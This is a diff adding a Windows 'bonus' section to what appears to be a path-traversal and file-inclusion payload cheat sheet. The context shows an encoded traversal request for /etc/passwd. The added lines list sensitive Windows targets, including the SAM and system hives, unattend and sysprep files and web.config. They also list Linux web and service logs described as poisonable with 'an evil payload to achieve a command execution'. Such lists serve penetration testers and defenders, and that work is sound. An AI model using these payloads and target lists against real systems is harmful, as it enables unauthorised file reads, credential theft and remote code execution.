@@ -84,3 +84,53 @@ additional bypass:
 
 GET /%2e%2e%2e%2F%2e%5C%2Fetc/passwd
 
+
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+BONUS: Tests for Windows
+
+Interesting Windows files
+
+Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside...
+
+c:\windows\system32\license.rtf
+c:\windows\system32\eula.txt
+
+Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
+
+c:/boot.ini
+c:/inetpub/logs/logfiles
+c:/inetpub/wwwroot/global.asa
+c:/inetpub/wwwroot/index.asp
+c:/inetpub/wwwroot/web.config
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system32/inetsrv/metabase.xml
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system volume information/wpsettings.dat
+c:/system32/inetsrv/metabase.xml
+c:/unattend.txt
+c:/unattend.xml
+c:/unattended.txt
+c:/unattended.xml
+c:/windows/repair/sam
+c:/windows/repair/system
+
+The following log files are controllable and can be included with an evil payload to achieve a command execution
+
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
